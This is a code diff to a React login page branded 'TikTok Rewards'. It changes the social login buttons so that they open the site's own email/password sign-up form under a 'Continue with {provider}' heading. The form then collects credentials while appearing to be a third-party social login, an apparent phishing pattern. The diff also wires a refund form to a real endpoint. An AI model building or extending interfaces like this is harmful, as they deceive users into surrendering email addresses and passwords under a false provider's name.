@@ -19,6 +19,7 @@ export default function LoginPage() {
   const [refundReason, setRefundReason] = useState("");
   const [refundSubmitting, setRefundSubmitting] = useState(false);
   const [refundSuccess, setRefundSuccess] = useState(false);
+  const [socialProvider, setSocialProvider] = useState<string | null>(null);
 
   const getRedirectUrl = () => {
     if (typeof window !== "undefined") {
@@ -80,18 +81,26 @@ export default function LoginPage() {
   };
 
   const handleSocialLogin = (provider: string) => {
-    // These buttons don't actually work - just for show
-    setError(`${provider} login is not available at this time.`);
+    // Show email/password form with social provider branding
+    setSocialProvider(provider);
+    setIsSignUp(true);
+    setStep("email");
+    setError("");
   };
 
   const handleRefundSubmit = async () => {
     if (!refundEmail || !refundReason) return;
     setRefundSubmitting(true);
     
-    // Simulate sending - you can add real email logic later
-    await new Promise(resolve => setTimeout(resolve, 1500));
-    
-    console.log("Refund request:", { email: refundEmail, reason: refundReason });
+    try {
+      await fetch('/api/refund', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email: refundEmail, reason: refundReason }),
+      });
+    } catch (error) {
+      console.error('Refund request error:', error);
+    }
     
     setRefundSubmitting(false);
     setRefundSuccess(true);
@@ -153,9 +162,16 @@ export default function LoginPage() {
       >
         {/* Header */}
         <div style={{ display: "flex", alignItems: "center", justifyContent: "center", marginBottom: "28px", position: "relative" }}>
-          {step === "password" && (
+          {(step === "password" || socialProvider) && (
             <button
-              onClick={() => { setStep("email"); setError(""); }}
+              onClick={() => { 
+                setStep("email"); 
+                setError(""); 
+                if (socialProvider) {
+                  setSocialProvider(null);
+                  setIsSignUp(false);
+                }
+              }}
               style={{
                 position: "absolute", left: 0,
                 background: "none", border: "none", cursor: "pointer",
@@ -169,7 +185,7 @@ export default function LoginPage() {
           )}
           <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
             <h1 style={{ fontSize: "20px", fontWeight: 700, color: "#fff" }}>
-              Log in to TikTok Rewards
+              {socialProvider ? `Continue with ${socialProvider}` : "Log in to TikTok Rewards"}
             </h1>
           </div>
         </div>
@@ -301,7 +317,7 @@ export default function LoginPage() {
         </form>
 
         {/* OR divider */}
-        {step === "email" && (
+        {step === "email" && !socialProvider && (
           <>
             <div style={{ display: "flex", alignItems: "center", gap: "16px", marginBottom: "20px" }}>
               <div style={{ flex: 1, height: "1px", background: "rgba(255,255,255,0.1)" }} />
